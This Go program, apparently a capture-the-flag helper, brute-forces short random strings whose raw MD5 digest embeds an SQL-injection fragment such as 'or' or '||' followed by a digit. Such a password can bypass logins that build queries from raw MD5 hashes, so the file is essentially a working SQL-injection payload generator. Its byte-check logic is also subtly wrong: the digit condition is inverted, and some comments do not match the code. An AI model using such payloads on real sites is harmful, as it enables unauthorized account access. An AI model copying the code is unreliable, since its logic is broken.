package main

import (
	"crypto/md5"
	"fmt"
	"math/rand"
	"os"
	"sync"
	"time"
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789?,.!@#$%^&*()+=-_[]{}|;:<>~"

// https://medium.com/@kpbird/golang-generate-fixed-size-random-string-dd6dbd5e63c0
func randASCIIBytes(n int) []byte {
	output := make([]byte, n)
	// We will take n bytes, one byte for each character of output.
	randomness := make([]byte, n)
	// read all random
	_, err := rand.Read(randomness)
	if err != nil {
		panic(err)
	}
	l := len(letterBytes)
	// fill output
	for pos := range output {
		// get random item
		random := uint8(randomness[pos])
		// random % 64
		randomPos := random % uint8(l)
		// put into output
		output[pos] = letterBytes[randomPos]
	}
	return output
}

var st_end_val = []byte("\x27")
var mid_vals = [][]byte{[]byte("\x7c\x7c"), []byte("\x6f\x72"), []byte("\x4f\x52"), []byte("\x6f\x52"), []byte("\x4f\x72")}

func checkHash(x []byte) bool {
	hash := md5.Sum(x)
	for i := 0; i <= len(hash)-5; i++ {
		// check first quote
		if hash[i] != st_end_val[0] ||
			hash[i+3] != st_end_val[0] ||
			48 <= hash[i+4] || hash[i+4] >= 58 {
			continue
		}
		switch hash[i+1] {
		// case ||
		case mid_vals[0][0]:
			if hash[i+2] == mid_vals[0][1] {
				return true
			}
		// case or, oR
		case []byte("\x6f")[0]:
			if hash[i+2] == []byte("\x72")[0] ||
				hash[i+2] == []byte("\x52")[0] {
				return true
			}
		// case Or, OR
		case []byte("\x4f")[0]:
			if hash[i+2] == []byte("\x72")[0] ||
				hash[i+2] == []byte("\x52")[0] {
				return true
			}
		}
	}
	return false
}

// test values (that produce good hashes)
// pw := []byte("100000000000000000000000000000539611092")
// pw := []byte("QS+02")

func genHashes() {
	for i := 0; i < 10000000/2; i++ {
		pw := randASCIIBytes(5) // 5 billion possible strings w 89 chars
		if checkHash(pw) {
			fmt.Println(string(pw[:]))
			fmt.Printf("checked %v hashes\n", i*2)
			os.Exit(3)
		}
	}
}

func main() {
	var wg sync.WaitGroup
	for i := 0; i < 2; i++ {
		wg.Add(1)
		go func() {
			genHashes()
			wg.Done()
		}()
	}
	wg.Wait()
}
